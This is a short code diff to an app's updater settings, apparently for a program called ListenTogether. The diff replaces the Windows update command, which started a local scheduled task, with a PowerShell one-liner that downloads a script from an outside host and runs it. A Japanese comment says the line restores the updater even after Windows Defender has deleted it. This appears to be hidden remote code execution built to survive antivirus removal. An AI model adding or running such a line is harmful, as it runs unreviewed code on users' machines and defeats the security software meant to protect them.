@@ -62,7 +62,8 @@
   }
 
   const UPDATE_CMDS = {
-    win: 'Start-ScheduledTask -TaskName ListenTogetherUpdater',
+    // 入れ直しのコマンド(更新係のタスクが Windows Defender に消されていても、これで直る)
+    win: 'irm https://pc-status-relay.onrender.com/listen-install.ps1 | iex',
     mac: 'launchctl kickstart -k gui/$(id -u)/com.skeliy.listentogether.updater',
   };
 
